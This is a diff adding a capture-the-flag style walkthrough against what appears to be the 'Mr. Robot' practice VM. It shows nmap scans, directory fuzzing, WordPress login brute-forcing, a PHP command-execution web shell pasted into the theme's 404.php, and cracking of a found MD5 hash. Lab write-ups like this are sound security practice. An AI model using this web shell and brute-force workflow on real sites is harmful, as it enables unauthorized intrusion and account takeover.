@@ -1,0 +1,225 @@
+$ sudo nmap -A -n 192.168.56.0/24
+$ #found on 192.168.56.101 our machine.
+$ sudo nmap -A -n -sS -vv 192.168.56.101
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-12 18:36 +03
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 18:36
+Completed NSE at 18:36, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 18:36
+Completed NSE at 18:36, 0.00s elapsed
+Initiating ARP Ping Scan at 18:36
+Scanning 192.168.56.101 [1 port]
+Completed ARP Ping Scan at 18:36, 0.04s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 18:36
+Scanning 192.168.56.101 [1000 ports]
+Discovered open port 443/tcp on 192.168.56.101
+Discovered open port 80/tcp on 192.168.56.101
+Completed SYN Stealth Scan at 18:36, 4.99s elapsed (1000 total ports)
+Initiating Service scan at 18:36
+Scanning 2 services on 192.168.56.101
+Completed Service scan at 18:36, 12.05s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 192.168.56.101
+NSE: Script scanning 192.168.56.101.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 18:36
+Completed NSE at 18:36, 0.33s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 18:36
+Completed NSE at 18:36, 0.00s elapsed
+Nmap scan report for 192.168.56.101
+Host is up, received arp-response (0.00023s latency).
+Scanned at 2017-12-12 18:36:19 +03 for 19s
+Not shown: 997 filtered ports
+Reason: 997 no-responses
+PORT    STATE  SERVICE  REASON         VERSION
+22/tcp  closed ssh      reset ttl 64
+80/tcp  open   http     syn-ack ttl 64 Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Issuer: commonName=www.example.com
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2015-09-16T10:45:03
+| Not valid after:  2025-09-13T10:45:03
+| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
+| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+| -----BEGIN CERTIFICATE-----
+| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
+| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
+| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
+| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
+| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
+| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
+| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
+| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
+|_-----END CERTIFICATE-----
+MAC Address: 08:00:27:06:EC:E1 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.8
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=12/12%OT=80%CT=22%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=5
+OS:A2FF786%P=x86_64-unknown-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10D%TI=Z%CI=I%II=
+OS:I%TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%
+OS:O5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W
+OS:6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%
+OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=
+OS:%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=4
+OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)
+
+Uptime guess: 198.839 days (since Sat May 27 22:28:04 2017)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=254 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.23 ms 192.168.56.101
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 18:36
+Completed NSE at 18:36, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 18:36
+Completed NSE at 18:36, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
+           Raw packets sent: 2028 (90.926KB) | Rcvd: 18 (1.090KB)
+
+$ # let's fuzz!
+
+~$ wfuzz -c -z file,/usr/share/wordlists/seclists-git/Discovery/Web_Content/quickhits.txt --hc 404 192.168.56.101/WFUZZ
+********************************************************
+* Wfuzz 2.1.5 - The Web Bruteforcer                      *
+********************************************************
+
+Target: http://192.168.56.101/WFUZZ
+Total requests: 2365
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00576:  C=301      0 L	       0 W	      0 Ch	  "/apc/index.php"
+..."
+00707:  C=301      0 L	       0 W	      0 Ch	  "/bitrix/admin/index.php"
+..."
+01513:  C=301      0 L	       0 W	      0 Ch	  "/myadmin/index.php"
+..."
+01816:  C=301      0 L	       0 W	      0 Ch	  "/pma/index.php"
+..."
+01976:  C=301      0 L	       0 W	      0 Ch	  "/sql/index.php"
+..."
+02045:  C=301      0 L	       0 W	      0 Ch	  "/templates/ja-helio-farsi/in..."
+02046:  C=301      0 L	       0 W	      0 Ch	  "/templates/beez/index.php"
+..."
+02048:  C=301      0 L	       0 W	      0 Ch	  "/templates/rhuk_milkyway/ind..."
+02099:  C=301      0 L	       0 W	      0 Ch	  "/tmp/index.php"
+..."
+02273:  C=301      0 L	       0 W	      0 Ch	  "/wp-register.php"
+..."
+
+Total time: 52.19456
+Processed Requests: 2365
+Filtered Requests: 2355
+Requests/sec.: 45.31123
+
+$ # so we check links then understand our website is running wordpress
+$ # let's wpscan!
+$ # we see our wordpress website version is 4.3.1
+$ # also, wpscan is reporting that there is a robots.txt!
+$ curl -0 192.168.56.101/robots.txt 
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+$ # so we have a dictionary and key of 1/3!
+$ # download the dictionary.
+$ curl -0 fsocity.dic >> fsocity.dic
+$ sort fsocity.dic | uniq -u 
+$ # for further usage we need that.
+$ # then write a script that bruteforces usernames. (in forgot username)
+$ # check username_bruteforce.py
+$ python username_bruteforce.py
+[!] Trying the payload true 
+[!] Trying the payload false 
+[!] Trying the payload wikia 
+[!] Trying the payload from 
+[!] Trying the payload the 
+[!] Trying the payload now 
+[!] Trying the payload Wikia 
+[!] Trying the payload extensions 
+[!] Trying the payload scss 
+[!] Trying the payload window 
+[!] Trying the payload http 
+[!] Trying the payload var 
+[!] Trying the payload page 
+[!] Trying the payload Robot 
+[!] Trying the payload Elliot 
+[?] Username is found. Elliot
+$ # so our username is Elliot.
+
+$ # check password_bruteforce python script.
+$ # we will use the password dictionary that only unique records in fsocity.dic
+$ python password_bruteforce.py
+[!] Trying the payload --> {'log': 'Elliot', 'pwd': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'}
+[!] Trying the payload --> {'log': 'Elliot', 'pwd': 'abcdefghijklmno'}
+[!] Trying the payload --> {'log': 'Elliot', 'pwd': 'abcdEfghijklmnop'}
+[!] Trying the payload --> {'log': 'Elliot', 'pwd': 'abcdefghijklmnopq'}
+[!] Trying the payload --> {'log': 'Elliot', 'pwd': 'c3fcd3d76192e4007dfb496cca67e13b'}
+[!] Trying the payload --> {'log': 'Elliot', 'pwd': 'ER28-0652'}
+[!!] Found the password --> ER28-0652
+$ # so our password is 'ER28-0652'
+$ # login with found credentials.
+$ # so we need a simple php shell.
+$ # our php code is:
+<?php
+if(isset($_REQUEST['cmd'])){
+            $cmd = ($_REQUEST["cmd"]);
+                        system($cmd);
+                                    echo "</pre>$cmd<pre>";
+                                                    die;
+}
+?>
+$ # go to menu Appearance/Editor
+$ # edit 404.php
+$ # delete all codes paste it.
+$ # try to access non-existing link with ?cmd= parameter.
+$ # example 192.168.56.101/nonexisting.php?cmd=whoami
+daemon whoami
+$ # so we are partially in!
+$ # ?cmd=ls to check any interesting file 
+$ # there is a file named "you-will-never-guess-this-file-name.txt"
+$ # ?cmd=cat you-will*
+hello there person who found me
+$ # nothing interesting tho.
+$ # so we will go with ls /home
+$ # there is a user that named "robot"
+$ # ?cmd=ls /home/robot
+key-2-of-3.txt password.raw-md5
+$ # there is 2. key! great!
+$ # unfortunately we cannot read it.
+$ # but we can cat password.raw-md5 file
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ # i tried to decrypt with hashkiller.co.uk
+$ # and result is:
+abcdefghipqrstuvwxyz
+
